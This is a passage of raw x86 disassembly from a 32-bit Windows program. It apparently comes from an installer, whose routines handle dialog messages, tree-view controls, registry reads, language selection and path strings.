  405a4a:	e8 3e 13 00 00       	call   0x406d8d
  405a4f:	ff 74 24 0c          	push   0xc(%esp)
  405a53:	e8 e4 ba ff ff       	call   0x40153c
  405a58:	56                   	push   %esi
  405a59:	57                   	push   %edi
  405a5a:	e8 51 19 00 00       	call   0x4073b0
  405a5f:	5f                   	pop    %edi
  405a60:	5e                   	pop    %esi
  405a61:	c2 08 00             	ret    $0x8
  405a64:	a1 fc 61 47 00       	mov    0x4761fc,%eax
  405a69:	85 c0                	test   %eax,%eax
  405a6b:	74 0f                	je     0x405a7c
  405a6d:	6a 00                	push   $0x0
  405a6f:	6a 00                	push   $0x0
  405a71:	ff 74 24 0c          	push   0xc(%esp)
  405a75:	50                   	push   %eax
  405a76:	ff 15 64 92 40 00    	call   *0x409264
  405a7c:	c2 04 00             	ret    $0x4
  405a7f:	6a 01                	push   $0x1
  405a81:	ff 74 24 08          	push   0x8(%esp)
  405a85:	6a 28                	push   $0x28
  405a87:	ff 35 18 62 47 00    	push   0x476218
  405a8d:	ff 15 64 92 40 00    	call   *0x409264
  405a93:	c2 04 00             	ret    $0x4
  405a96:	ff 74 24 0c          	push   0xc(%esp)
  405a9a:	6a 00                	push   $0x0
  405a9c:	e8 f0 09 00 00       	call   0x406491
  405aa1:	50                   	push   %eax
  405aa2:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405aa6:	05 e8 03 00 00       	add    $0x3e8,%eax
  405aab:	50                   	push   %eax
  405aac:	ff 74 24 0c          	push   0xc(%esp)
  405ab0:	e8 ef 18 00 00       	call   0x4073a4
  405ab5:	c2 0c 00             	ret    $0xc
  405ab8:	83 3d ec e2 47 00 00 	cmpl   $0x0,0x47e2ec
  405abf:	a1 54 1d 45 00       	mov    0x451d54,%eax
  405ac4:	0f 45 05 58 1d 45 00 	cmovne 0x451d58,%eax
  405acb:	6a 01                	push   $0x1
  405acd:	6a 01                	push   $0x1
  405acf:	68 f4 00 00 00       	push   $0xf4
  405ad4:	50                   	push   %eax
  405ad5:	ff 15 64 92 40 00    	call   *0x409264
  405adb:	c3                   	ret
  405adc:	8b 44 24 10          	mov    0x10(%esp),%eax
  405ae0:	81 ec 80 00 00 00    	sub    $0x80,%esp
  405ae6:	53                   	push   %ebx
  405ae7:	55                   	push   %ebp
  405ae8:	56                   	push   %esi
  405ae9:	57                   	push   %edi
  405aea:	6a dc                	push   $0xffffffdc
  405aec:	5f                   	pop    %edi
  405aed:	85 c0                	test   %eax,%eax
  405aef:	74 0f                	je     0x405b00
  405af1:	8b b4 24 9c 00 00 00 	mov    0x9c(%esp),%esi
  405af8:	0f ac c6 14          	shrd   $0x14,%eax,%esi
  405afc:	33 db                	xor    %ebx,%ebx
  405afe:	eb 68                	jmp    0x405b68
  405b00:	8b 94 24 9c 00 00 00 	mov    0x9c(%esp),%edx
  405b07:	b8 00 00 10 00       	mov    $0x100000,%eax
  405b0c:	8b f2                	mov    %edx,%esi
  405b0e:	bd 00 04 00 00       	mov    $0x400,%ebp
  405b13:	3b f0                	cmp    %eax,%esi
  405b15:	6a 14                	push   $0x14
  405b17:	1b c9                	sbb    %ecx,%ecx
  405b19:	83 e1 f6             	and    $0xfffffff6,%ecx
  405b1c:	5b                   	pop    %ebx
  405b1d:	03 cb                	add    %ebx,%ecx
  405b1f:	3b f0                	cmp    %eax,%esi
  405b21:	6a de                	push   $0xffffffde
  405b23:	1b c0                	sbb    %eax,%eax
  405b25:	f7 d8                	neg    %eax
  405b27:	03 f8                	add    %eax,%edi
  405b29:	3b f5                	cmp    %ebp,%esi
  405b2b:	58                   	pop    %eax
  405b2c:	0f 42 f8             	cmovb  %eax,%edi
  405b2f:	33 db                	xor    %ebx,%ebx
  405b31:	3b f5                	cmp    %ebp,%esi
  405b33:	0f 43 d9             	cmovae %ecx,%ebx
  405b36:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  405b3c:	73 10                	jae    0x405b4e
  405b3e:	33 c0                	xor    %eax,%eax
  405b40:	8b cb                	mov    %ebx,%ecx
  405b42:	40                   	inc    %eax
  405b43:	d3 e0                	shl    %cl,%eax
  405b45:	6a 14                	push   $0x14
  405b47:	99                   	cltd
  405b48:	59                   	pop    %ecx
  405b49:	f7 f9                	idiv   %ecx
  405b4b:	8d 14 06             	lea    (%esi,%eax,1),%edx
  405b4e:	8b f2                	mov    %edx,%esi
  405b50:	8b cb                	mov    %ebx,%ecx
  405b52:	81 e2 ff ff ff 00    	and    $0xffffff,%edx
  405b58:	d3 ee                	shr    %cl,%esi
  405b5a:	6b c2 0a             	imul   $0xa,%edx,%eax
  405b5d:	33 d2                	xor    %edx,%edx
  405b5f:	6a 0a                	push   $0xa
  405b61:	d3 e8                	shr    %cl,%eax
  405b63:	59                   	pop    %ecx
  405b64:	f7 f1                	div    %ecx
  405b66:	8b da                	mov    %edx,%ebx
  405b68:	ff b4 24 98 00 00 00 	push   0x98(%esp)
  405b6f:	bd 48 1d 44 00       	mov    $0x441d48,%ebp
  405b74:	55                   	push   %ebp
  405b75:	e8 17 09 00 00       	call   0x406491
  405b7a:	6a df                	push   $0xffffffdf
  405b7c:	8d 44 24 14          	lea    0x14(%esp),%eax
  405b80:	50                   	push   %eax
  405b81:	e8 0b 09 00 00       	call   0x406491
  405b86:	50                   	push   %eax
  405b87:	57                   	push   %edi
  405b88:	8d 44 24 58          	lea    0x58(%esp),%eax
  405b8c:	50                   	push   %eax
  405b8d:	e8 ff 08 00 00       	call   0x406491
  405b92:	50                   	push   %eax
  405b93:	53                   	push   %ebx
  405b94:	56                   	push   %esi
  405b95:	68 64 a4 40 00       	push   $0x40a464
  405b9a:	55                   	push   %ebp
  405b9b:	e8 26 18 00 00       	call   0x4073c6
  405ba0:	8d 04 45 48 1d 44 00 	lea    0x441d48(,%eax,2),%eax
  405ba7:	50                   	push   %eax
  405ba8:	ff 15 68 92 40 00    	call   *0x409268
  405bae:	83 c4 18             	add    $0x18,%esp
  405bb1:	55                   	push   %ebp
  405bb2:	ff b4 24 98 00 00 00 	push   0x98(%esp)
  405bb9:	ff 35 fc 61 47 00    	push   0x4761fc
  405bbf:	e8 e0 17 00 00       	call   0x4073a4
  405bc4:	5f                   	pop    %edi
  405bc5:	5e                   	pop    %esi
  405bc6:	5d                   	pop    %ebp
  405bc7:	5b                   	pop    %ebx
  405bc8:	81 c4 80 00 00 00    	add    $0x80,%esp
  405bce:	c2 10 00             	ret    $0x10
  405bd1:	55                   	push   %ebp
  405bd2:	8b ec                	mov    %esp,%ebp
  405bd4:	8b 45 10             	mov    0x10(%ebp),%eax
  405bd7:	d1 e8                	shr    $1,%eax
  405bd9:	50                   	push   %eax
  405bda:	a1 5c 1d 45 00       	mov    0x451d5c,%eax
  405bdf:	03 45 08             	add    0x8(%ebp),%eax
  405be2:	50                   	push   %eax
  405be3:	ff 75 0c             	push   0xc(%ebp)
  405be6:	ff 15 90 90 40 00    	call   *0x409090
  405bec:	ff 75 0c             	push   0xc(%ebp)
  405bef:	ff 15 8c 90 40 00    	call   *0x40908c
  405bf5:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405bf8:	03 c0                	add    %eax,%eax
  405bfa:	01 05 5c 1d 45 00    	add    %eax,0x451d5c
  405c00:	89 01                	mov    %eax,(%ecx)
  405c02:	33 c0                	xor    %eax,%eax
  405c04:	5d                   	pop    %ebp
  405c05:	c2 10 00             	ret    $0x10
  405c08:	55                   	push   %ebp
  405c09:	8b ec                	mov    %esp,%ebp
  405c0b:	a1 5c 1d 45 00       	mov    0x451d5c,%eax
  405c10:	56                   	push   %esi
  405c11:	8b 75 08             	mov    0x8(%ebp),%esi
  405c14:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405c17:	50                   	push   %eax
  405c18:	ff 15 8c 90 40 00    	call   *0x40908c
  405c1e:	8b 4d 10             	mov    0x10(%ebp),%ecx
  405c21:	d1 e9                	shr    $1,%ecx
  405c23:	3b c1                	cmp    %ecx,%eax
  405c25:	0f 43 c1             	cmovae %ecx,%eax
  405c28:	33 c9                	xor    %ecx,%ecx
  405c2a:	51                   	push   %ecx
  405c2b:	51                   	push   %ecx
  405c2c:	ff 75 10             	push   0x10(%ebp)
  405c2f:	ff 75 0c             	push   0xc(%ebp)
  405c32:	50                   	push   %eax
  405c33:	a1 5c 1d 45 00       	mov    0x451d5c,%eax
  405c38:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405c3b:	50                   	push   %eax
  405c3c:	51                   	push   %ecx
  405c3d:	51                   	push   %ecx
  405c3e:	ff 15 88 90 40 00    	call   *0x409088
  405c44:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405c47:	01 05 5c 1d 45 00    	add    %eax,0x451d5c
  405c4d:	5e                   	pop    %esi
  405c4e:	89 01                	mov    %eax,(%ecx)
  405c50:	33 c0                	xor    %eax,%eax
  405c52:	5d                   	pop    %ebp
  405c53:	c2 10 00             	ret    $0x10
  405c56:	55                   	push   %ebp
  405c57:	8b ec                	mov    %esp,%ebp
  405c59:	83 ec 38             	sub    $0x38,%esp
  405c5c:	57                   	push   %edi
  405c5d:	8b 3d 64 92 40 00    	mov    0x409264,%edi
  405c63:	6a 00                	push   $0x0
  405c65:	6a 09                	push   $0x9
  405c67:	68 0a 11 00 00       	push   $0x110a
  405c6c:	ff 75 08             	push   0x8(%ebp)
  405c6f:	ff d7                	call   *%edi
  405c71:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  405c75:	74 3e                	je     0x405cb5
  405c77:	ff 15 14 92 40 00    	call   *0x409214
  405c7d:	0f bf c8             	movswl %ax,%ecx
  405c80:	c1 e8 10             	shr    $0x10,%eax
  405c83:	98                   	cwtl
  405c84:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405c87:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405c8a:	50                   	push   %eax
  405c8b:	ff 75 08             	push   0x8(%ebp)
  405c8e:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  405c91:	ff 15 b0 91 40 00    	call   *0x4091b0
  405c97:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405c9a:	50                   	push   %eax
  405c9b:	6a 00                	push   $0x0
  405c9d:	68 11 11 00 00       	push   $0x1111
  405ca2:	ff 75 08             	push   0x8(%ebp)
  405ca5:	ff d7                	call   *%edi
  405ca7:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  405cab:	75 05                	jne    0x405cb2
  405cad:	83 c8 ff             	or     $0xffffffff,%eax
  405cb0:	eb 20                	jmp    0x405cd2
  405cb2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405cb5:	89 45 cc             	mov    %eax,-0x34(%ebp)
  405cb8:	8d 45 c8             	lea    -0x38(%ebp),%eax
  405cbb:	50                   	push   %eax
  405cbc:	6a 00                	push   $0x0
  405cbe:	68 3e 11 00 00       	push   $0x113e
  405cc3:	ff 75 08             	push   0x8(%ebp)
  405cc6:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  405ccd:	ff d7                	call   *%edi
  405ccf:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405cd2:	5f                   	pop    %edi
  405cd3:	c9                   	leave
  405cd4:	c2 08 00             	ret    $0x8
  405cd7:	55                   	push   %ebp
  405cd8:	8b ec                	mov    %esp,%ebp
  405cda:	8b 45 08             	mov    0x8(%ebp),%eax
  405cdd:	83 ec 0c             	sub    $0xc,%esp
  405ce0:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  405ce5:	56                   	push   %esi
  405ce6:	83 f8 05             	cmp    $0x5,%eax
  405ce9:	0f 87 b0 00 00 00    	ja     0x405d9f
  405cef:	6a eb                	push   $0xffffffeb
  405cf1:	ff 75 10             	push   0x10(%ebp)
  405cf4:	ff 15 a8 91 40 00    	call   *0x4091a8
  405cfa:	8b f0                	mov    %eax,%esi
  405cfc:	85 f6                	test   %esi,%esi
  405cfe:	0f 84 9b 00 00 00    	je     0x405d9f
  405d04:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
  405d08:	0f 87 91 00 00 00    	ja     0x405d9f
  405d0e:	83 7e 10 02          	cmpl   $0x2,0x10(%esi)
  405d12:	0f 87 87 00 00 00    	ja     0x405d9f
  405d18:	f7 46 14 e0 ff ff ff 	testl  $0xffffffe0,0x14(%esi)
  405d1f:	75 7e                	jne    0x405d9f
  405d21:	f6 46 14 02          	testb  $0x2,0x14(%esi)
  405d25:	8b 06                	mov    (%esi),%eax
  405d27:	74 07                	je     0x405d30
  405d29:	50                   	push   %eax
  405d2a:	ff 15 ac 91 40 00    	call   *0x4091ac
  405d30:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  405d34:	74 0a                	je     0x405d40
  405d36:	50                   	push   %eax
  405d37:	ff 75 0c             	push   0xc(%ebp)
  405d3a:	ff 15 64 90 40 00    	call   *0x409064
  405d40:	ff 76 10             	push   0x10(%esi)
  405d43:	ff 75 0c             	push   0xc(%ebp)
  405d46:	ff 15 4c 90 40 00    	call   *0x40904c
  405d4c:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  405d50:	8b 46 04             	mov    0x4(%esi),%eax
  405d53:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405d56:	74 0a                	je     0x405d62
  405d58:	50                   	push   %eax
  405d59:	ff 15 ac 91 40 00    	call   *0x4091ac
  405d5f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405d62:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  405d66:	74 0a                	je     0x405d72
  405d68:	50                   	push   %eax
  405d69:	ff 75 0c             	push   0xc(%ebp)
  405d6c:	ff 15 60 90 40 00    	call   *0x409060
  405d72:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  405d76:	74 22                	je     0x405d9a
  405d78:	83 7e 0c 00          	cmpl   $0x0,0xc(%esi)
  405d7c:	8b 46 08             	mov    0x8(%esi),%eax
  405d7f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405d82:	74 09                	je     0x405d8d
  405d84:	ff 76 0c             	push   0xc(%esi)
  405d87:	ff 15 5c 90 40 00    	call   *0x40905c
  405d8d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405d90:	50                   	push   %eax
  405d91:	ff 15 50 90 40 00    	call   *0x409050
  405d97:	89 46 0c             	mov    %eax,0xc(%esi)
  405d9a:	8b 46 0c             	mov    0xc(%esi),%eax
  405d9d:	eb 02                	jmp    0x405da1
  405d9f:	33 c0                	xor    %eax,%eax
  405da1:	5e                   	pop    %esi
  405da2:	c9                   	leave
  405da3:	c2 0c 00             	ret    $0xc
  405da6:	8b 0d 4c e2 47 00    	mov    0x47e24c,%ecx
  405dac:	33 c0                	xor    %eax,%eax
  405dae:	8b 15 48 e2 47 00    	mov    0x47e248,%edx
  405db4:	85 c9                	test   %ecx,%ecx
  405db6:	74 1a                	je     0x405dd2
  405db8:	56                   	push   %esi
  405db9:	8b 74 24 08          	mov    0x8(%esp),%esi
  405dbd:	49                   	dec    %ecx
  405dbe:	f6 42 08 01          	testb  $0x1,0x8(%edx)
  405dc2:	74 03                	je     0x405dc7
  405dc4:	03 04 b2             	add    (%edx,%esi,4),%eax
  405dc7:	81 c2 18 40 00 00    	add    $0x4018,%edx
  405dcd:	85 c9                	test   %ecx,%ecx
  405dcf:	75 ec                	jne    0x405dbd
  405dd1:	5e                   	pop    %esi
  405dd2:	c2 04 00             	ret    $0x4
  405dd5:	68 54 a3 40 00       	push   $0x40a354
  405dda:	68 00 30 4d 00       	push   $0x4d3000
  405ddf:	68 a0 c9 46 00       	push   $0x46c9a0
  405de4:	e8 c7 15 00 00       	call   0x4073b0
  405de9:	50                   	push   %eax
  405dea:	e8 d5 0e 00 00       	call   0x406cc4
  405def:	50                   	push   %eax
  405df0:	e8 b5 15 00 00       	call   0x4073aa
  405df5:	c3                   	ret
  405df6:	56                   	push   %esi
  405df7:	8b 35 48 e2 47 00    	mov    0x47e248,%esi
  405dfd:	57                   	push   %edi
  405dfe:	8b 3d 4c e2 47 00    	mov    0x47e24c,%edi
  405e04:	6a 00                	push   $0x0
  405e06:	ff 15 a4 92 40 00    	call   *0x4092a4
  405e0c:	09 05 80 e2 47 00    	or     %eax,0x47e280
  405e12:	6a 00                	push   $0x0
  405e14:	e8 4b fc ff ff       	call   0x405a64
  405e19:	85 ff                	test   %edi,%edi
  405e1b:	74 2d                	je     0x405e4a
  405e1d:	83 c6 18             	add    $0x18,%esi
  405e20:	4f                   	dec    %edi
  405e21:	f6 46 f0 01          	testb  $0x1,-0x10(%esi)
  405e25:	56                   	push   %esi
  405e26:	74 3c                	je     0x405e64
  405e28:	68 78 a4 40 00       	push   $0x40a478
  405e2d:	e8 f2 0f 00 00       	call   0x406e24
  405e32:	59                   	pop    %ecx
  405e33:	59                   	pop    %ecx
  405e34:	ff 74 24 0c          	push   0xc(%esp)
  405e38:	ff 76 f4             	push   -0xc(%esi)
  405e3b:	e8 59 b5 ff ff       	call   0x401399
  405e40:	85 c0                	test   %eax,%eax
  405e42:	74 2c                	je     0x405e70
  405e44:	ff 05 ec e2 47 00    	incl   0x47e2ec
  405e4a:	68 04 04 00 00       	push   $0x404
  405e4f:	e8 10 fc ff ff       	call   0x405a64
  405e54:	ff 15 a8 92 40 00    	call   *0x4092a8
  405e5a:	a1 ec e2 47 00       	mov    0x47e2ec,%eax
  405e5f:	5f                   	pop    %edi
  405e60:	5e                   	pop    %esi
  405e61:	c2 04 00             	ret    $0x4
  405e64:	68 94 a4 40 00       	push   $0x40a494
  405e69:	e8 b6 0f 00 00       	call   0x406e24
  405e6e:	59                   	pop    %ecx
  405e6f:	59                   	pop    %ecx
  405e70:	81 c6 18 40 00 00    	add    $0x4018,%esi
  405e76:	85 ff                	test   %edi,%edi
  405e78:	75 a6                	jne    0x405e20
  405e7a:	eb ce                	jmp    0x405e4a
  405e7c:	55                   	push   %ebp
  405e7d:	8b ec                	mov    %esp,%ebp
  405e7f:	56                   	push   %esi
  405e80:	8b 75 14             	mov    0x14(%ebp),%esi
  405e83:	57                   	push   %edi
  405e84:	8b 7d 0c             	mov    0xc(%ebp),%edi
  405e87:	8b c7                	mov    %edi,%eax
  405e89:	81 ff 02 01 00 00    	cmp    $0x102,%edi
  405e8f:	75 14                	jne    0x405ea5
  405e91:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  405e95:	75 53                	jne    0x405eea
  405e97:	68 13 04 00 00       	push   $0x413
  405e9c:	e8 c3 fb ff ff       	call   0x405a64
  405ea1:	33 c0                	xor    %eax,%eax
  405ea3:	eb 59                	jmp    0x405efe
  405ea5:	81 ff 00 02 00 00    	cmp    $0x200,%edi
  405eab:	75 20                	jne    0x405ecd
  405ead:	ff 75 08             	push   0x8(%ebp)
  405eb0:	ff 15 fc 91 40 00    	call   *0x4091fc
  405eb6:	85 c0                	test   %eax,%eax
  405eb8:	74 30                	je     0x405eea
  405eba:	6a 01                	push   $0x1
  405ebc:	ff 75 08             	push   0x8(%ebp)
  405ebf:	e8 92 fd ff ff       	call   0x405c56
  405ec4:	8b f0                	mov    %eax,%esi
  405ec6:	bf 19 04 00 00       	mov    $0x419,%edi
  405ecb:	eb 07                	jmp    0x405ed4
  405ecd:	3d 19 04 00 00       	cmp    $0x419,%eax
  405ed2:	75 16                	jne    0x405eea
  405ed4:	39 35 68 9d 45 00    	cmp    %esi,0x459d68
  405eda:	74 0e                	je     0x405eea
  405edc:	56                   	push   %esi
  405edd:	6a 06                	push   $0x6
  405edf:	89 35 68 9d 45 00    	mov    %esi,0x459d68
  405ee5:	e8 48 fb ff ff       	call   0x405a32
  405eea:	56                   	push   %esi
  405eeb:	ff 75 10             	push   0x10(%ebp)
  405eee:	57                   	push   %edi
  405eef:	ff 75 08             	push   0x8(%ebp)
  405ef2:	ff 35 64 1d 45 00    	push   0x451d64
  405ef8:	ff 15 10 92 40 00    	call   *0x409210
  405efe:	5f                   	pop    %edi
  405eff:	5e                   	pop    %esi
  405f00:	5d                   	pop    %ebp
  405f01:	c2 10 00             	ret    $0x10
  405f04:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  405f09:	75 06                	jne    0x405f11
  405f0b:	ff 05 0c 62 47 00    	incl   0x47620c
  405f11:	6a 00                	push   $0x0
  405f13:	ff 74 24 08          	push   0x8(%esp)
  405f17:	68 08 04 00 00       	push   $0x408
  405f1c:	ff 35 18 62 47 00    	push   0x476218
  405f22:	ff 15 64 92 40 00    	call   *0x409264
  405f28:	c2 04 00             	ret    $0x4
  405f2b:	53                   	push   %ebx
  405f2c:	55                   	push   %ebp
  405f2d:	56                   	push   %esi
  405f2e:	57                   	push   %edi
  405f2f:	68 00 f0 4d 00       	push   $0x4df000
  405f34:	bf ff ff 00 00       	mov    $0xffff,%edi
  405f39:	e8 7d 15 00 00       	call   0x4074bb
  405f3e:	8b 1d 30 e2 47 00    	mov    0x47e230,%ebx
  405f44:	8b 35 60 e2 47 00    	mov    0x47e260,%esi
  405f4a:	0f b7 e8             	movzwl %ax,%ebp
  405f4d:	8b 15 64 e2 47 00    	mov    0x47e264,%edx
  405f53:	85 d2                	test   %edx,%edx
  405f55:	74 35                	je     0x405f8c
  405f57:	8b 4b 64             	mov    0x64(%ebx),%ecx
  405f5a:	0f af ca             	imul   %edx,%ecx
  405f5d:	2b 4b 64             	sub    0x64(%ebx),%ecx
  405f60:	4a                   	dec    %edx
  405f61:	66 8b 04 31          	mov    (%ecx,%esi,1),%ax
  405f65:	66 33 c5             	xor    %bp,%ax
  405f68:	66 85 c7             	test   %ax,%di
  405f6b:	74 06                	je     0x405f73
  405f6d:	85 d2                	test   %edx,%edx
  405f6f:	75 ec                	jne    0x405f5d
  405f71:	eb 19                	jmp    0x405f8c
  405f73:	8b 44 31 02          	mov    0x2(%ecx,%esi,1),%eax
  405f77:	a3 f4 61 47 00       	mov    %eax,0x4761f4
  405f7c:	8b 44 31 06          	mov    0x6(%ecx,%esi,1),%eax
  405f80:	a3 08 e3 47 00       	mov    %eax,0x47e308
  405f85:	8d 46 0a             	lea    0xa(%esi),%eax
  405f88:	03 c1                	add    %ecx,%eax
  405f8a:	75 17                	jne    0x405fa3
  405f8c:	33 c9                	xor    %ecx,%ecx
  405f8e:	ba ff ff 00 00       	mov    $0xffff,%edx
  405f93:	66 3b fa             	cmp    %dx,%di
  405f96:	b8 ff 03 00 00       	mov    $0x3ff,%eax
  405f9b:	0f 45 c1             	cmovne %ecx,%eax
  405f9e:	0f b7 f8             	movzwl %ax,%edi
  405fa1:	eb aa                	jmp    0x405f4d
  405fa3:	a3 00 62 47 00       	mov    %eax,0x476200
  405fa8:	0f b7 04 31          	movzwl (%ecx,%esi,1),%eax
  405fac:	50                   	push   %eax
  405fad:	68 00 f0 4d 00       	push   $0x4df000
  405fb2:	e8 d6 0d 00 00       	call   0x406d8d
  405fb7:	e8 36 03 00 00       	call   0x4062f2
  405fbc:	8b 35 48 e2 47 00    	mov    0x47e248,%esi
  405fc2:	8b 3d 4c e2 47 00    	mov    0x47e24c,%edi
  405fc8:	eb 17                	jmp    0x405fe1
  405fca:	4f                   	dec    %edi
  405fcb:	83 3e 00             	cmpl   $0x0,(%esi)
  405fce:	74 0b                	je     0x405fdb
  405fd0:	ff 36                	push   (%esi)
  405fd2:	8d 46 18             	lea    0x18(%esi),%eax
  405fd5:	50                   	push   %eax
  405fd6:	e8 b6 04 00 00       	call   0x406491
  405fdb:	81 c6 18 40 00 00    	add    $0x4018,%esi
  405fe1:	85 ff                	test   %edi,%edi
  405fe3:	75 e5                	jne    0x405fca
  405fe5:	5f                   	pop    %edi
  405fe6:	5e                   	pop    %esi
  405fe7:	5d                   	pop    %ebp
  405fe8:	5b                   	pop    %ebx
  405fe9:	c3                   	ret
  405fea:	83 ec 10             	sub    $0x10,%esp
  405fed:	53                   	push   %ebx
  405fee:	55                   	push   %ebp
  405fef:	56                   	push   %esi
  405ff0:	57                   	push   %edi
  405ff1:	8b 3d 30 e2 47 00    	mov    0x47e230,%edi
  405ff7:	6a 02                	push   $0x2
  405ff9:	e8 7e 11 00 00       	call   0x40717c
  405ffe:	6a 30                	push   $0x30
  406000:	33 db                	xor    %ebx,%ebx
  406002:	59                   	pop    %ecx
  406003:	85 c0                	test   %eax,%eax
  406005:	74 12                	je     0x406019
  406007:	ff d0                	call   *%eax
  406009:	0f b7 c0             	movzwl %ax,%eax
  40600c:	50                   	push   %eax
  40600d:	68 00 f0 4d 00       	push   $0x4df000
  406012:	e8 76 0d 00 00       	call   0x406d8d
  406017:	eb 59                	jmp    0x406072
  406019:	6a 78                	push   $0x78
  40601b:	58                   	pop    %eax
  40601c:	53                   	push   %ebx
  40601d:	be 48 1d 44 00       	mov    $0x441d48,%esi
  406022:	66 a3 02 f0 4d 00    	mov    %ax,0x4df002
  406028:	56                   	push   %esi
  406029:	53                   	push   %ebx
  40602a:	68 70 a3 40 00       	push   $0x40a370
  40602f:	33 c0                	xor    %eax,%eax
  406031:	66 89 0d 00 f0 4d 00 	mov    %cx,0x4df000
  406038:	68 01 00 00 80       	push   $0x80000001
  40603d:	66 a3 04 f0 4d 00    	mov    %ax,0x4df004
  406043:	e8 c5 11 00 00       	call   0x40720d
  406048:	66 39 1d 48 1d 44 00 	cmp    %bx,0x441d48
  40604f:	75 16                	jne    0x406067
  406051:	53                   	push   %ebx
  406052:	56                   	push   %esi
  406053:	68 ac a3 40 00       	push   $0x40a3ac
  406058:	68 c0 a3 40 00       	push   $0x40a3c0
  40605d:	68 03 00 00 80       	push   $0x80000003
  406062:	e8 a6 11 00 00       	call   0x40720d
  406067:	56                   	push   %esi
  406068:	68 00 f0 4d 00       	push   $0x4df000
  40606d:	e8 38 13 00 00       	call   0x4073aa
  406072:	e8 b4 fe ff ff       	call   0x405f2b
  406077:	a1 2c e2 47 00       	mov    0x47e22c,%eax
  40607c:	bd 00 30 4d 00       	mov    $0x4d3000,%ebp
  406081:	83 e0 20             	and    $0x20,%eax
  406084:	c7 05 fc e2 47 00 00 	movl   $0x10000,0x47e2fc
  40608b:	00 01 00 
  40608e:	55                   	push   %ebp
  40608f:	a3 e0 e2 47 00       	mov    %eax,0x47e2e0
  406094:	e8 0d 0d 00 00       	call   0x406da6
  406099:	85 c0                	test   %eax,%eax
  40609b:	0f 85 92 00 00 00    	jne    0x406133
  4060a1:	8b 57 48             	mov    0x48(%edi),%edx
  4060a4:	85 d2                	test   %edx,%edx
  4060a6:	0f 84 87 00 00 00    	je     0x406133
  4060ac:	8b 0d 58 e2 47 00    	mov    0x47e258,%ecx
  4060b2:	be c0 e1 46 00       	mov    $0x46e1c0,%esi
  4060b7:	8b 47 4c             	mov    0x4c(%edi),%eax
  4060ba:	53                   	push   %ebx
  4060bb:	56                   	push   %esi
  4060bc:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  4060bf:	50                   	push   %eax
  4060c0:	8d 04 51             	lea    (%ecx,%edx,2),%eax
  4060c3:	50                   	push   %eax
  4060c4:	ff 77 44             	push   0x44(%edi)
  4060c7:	e8 41 11 00 00       	call   0x40720d
  4060cc:	66 a1 c0 e1 46 00    	mov    0x46e1c0,%ax
  4060d2:	66 85 c0             	test   %ax,%ax
  4060d5:	74 5c                	je     0x406133
  4060d7:	6a 22                	push   $0x22
  4060d9:	59                   	pop    %ecx
  4060da:	66 3b c1             	cmp    %cx,%ax
  4060dd:	75 11                	jne    0x4060f0
  4060df:	51                   	push   %ecx
  4060e0:	be c2 e1 46 00       	mov    $0x46e1c2,%esi
  4060e5:	56                   	push   %esi
  4060e6:	e8 79 0c 00 00       	call   0x406d64
  4060eb:	33 c9                	xor    %ecx,%ecx
  4060ed:	66 89 08             	mov    %cx,(%eax)
  4060f0:	56                   	push   %esi
  4060f1:	e8 d0 12 00 00       	call   0x4073c6
  4060f6:	83 c0 fc             	add    $0xfffffffc,%eax
  4060f9:	8d 04 46             	lea    (%esi,%eax,2),%eax
  4060fc:	3b c6                	cmp    %esi,%eax
  4060fe:	76 26                	jbe    0x406126
  406100:	68 50 a4 40 00       	push   $0x40a450
  406105:	50                   	push   %eax
  406106:	ff 15 e8 90 40 00    	call   *0x4090e8
  40610c:	85 c0                	test   %eax,%eax
  40610e:	75 16                	jne    0x406126
  406110:	56                   	push   %esi
  406111:	ff 15 2c 91 40 00    	call   *0x40912c
  406117:	83 f8 ff             	cmp    $0xffffffff,%eax
  40611a:	74 04                	je     0x406120
  40611c:	a8 10                	test   $0x10,%al
  40611e:	75 06                	jne    0x406126
  406120:	56                   	push   %esi
  406121:	e8 80 14 00 00       	call   0x4075a6
  406126:	56                   	push   %esi
  406127:	e8 98 0b 00 00       	call   0x406cc4
  40612c:	50                   	push   %eax
  40612d:	55                   	push   %ebp
  40612e:	e8 7d 12 00 00       	call   0x4073b0
  406133:	55                   	push   %ebp
  406134:	e8 6d 0c 00 00       	call   0x406da6
  406139:	85 c0                	test   %eax,%eax
  40613b:	75 0c                	jne    0x406149
  40613d:	ff b7 18 01 00 00    	push   0x118(%edi)
  406143:	55                   	push   %ebp
  406144:	e8 48 03 00 00       	call   0x406491
  406149:	33 ed                	xor    %ebp,%ebp
  40614b:	45                   	inc    %ebp
  40614c:	f6 05 2c e2 47 00 10 	testb  $0x10,0x47e22c
  406153:	74 13                	je     0x406168
  406155:	39 1d 24 e2 47 00    	cmp    %ebx,0x47e224
  40615b:	75 0b                	jne    0x406168
  40615d:	e8 73 fc ff ff       	call   0x405dd5
  406162:	89 2d a0 d1 46 00    	mov    %ebp,0x46d1a0
  406168:	68 40 80 00 00       	push   $0x8040
  40616d:	53                   	push   %ebx
  40616e:	53                   	push   %ebx
  40616f:	55                   	push   %ebp
  406170:	6a 67                	push   $0x67
  406172:	ff 35 14 62 47 00    	push   0x476214
